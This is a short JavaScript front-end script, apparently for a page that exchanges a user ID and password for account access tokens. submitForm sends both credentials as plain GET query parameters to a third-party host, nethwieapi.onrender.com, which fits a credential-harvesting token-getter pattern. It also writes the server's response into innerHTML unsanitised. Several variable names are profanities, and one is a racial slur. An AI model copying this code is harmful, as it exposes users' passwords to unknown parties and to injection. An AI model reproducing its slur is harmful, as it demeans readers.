const val = (burat) => {
  return document.getElementById(burat);
};

function showResult(title, message, icon) {
  Swal.fire({
    title: title,
    html: message,
    icon: icon,
  //  showCancelButton: true,
    confirmButtonColor: "#0061ff",
  // cancelButtonColor: "#d33",
    confirmButtonText: "Okay"
  });
}

async function submitForm() {
   event.preventDefault();
   const result = val("result");
   const button = val("button");
   const nigga = val("nigga");
   const iyot = [
     val('uid').value,
     val('password').value
   ]
   try {
     button.style.display = 'none';
     nigga.style.display = 'block';
     const response = await fetch('https://nethwieapi.onrender.com/token'
     + `?u=${iyot[0] ? iyot[0] : ``}&p=${iyot[1] ? iyot[1] : ``}`);
     const data = await response.json();
     const _123_ = `Message: ${data.message}<br><pre>${data.token1}</pre><pre>${data.token2}</pre><pre>${data.token3}</pre>`;
     if (data.status) {
       val("submittions").innerHTML = _123_;
       } else {
       result.style.backgroundColor = '#3D1619';
       result.style.color = '#ffffff';
       result.innerHTML = data.message;
     }
   } catch (e) {
     console.error(e);
     result.style.backgroundColor = '#3D1619';
     result.style.color = '#ffffff';
     result.innerHTML = e.message;
   }
   nigga.style.display = 'none';
   result.style.display = 'block';
   button.style.display = 'block';
   setTimeout(() => result.style.display = 'none', 5*1000);
 }
 
 const yawa_ka = [val("uid"), val("password")]
 for (const rin of yawa_ka){
 rin.addEventListener('input', () => {
   var sagbot = rin.value;
 });
 }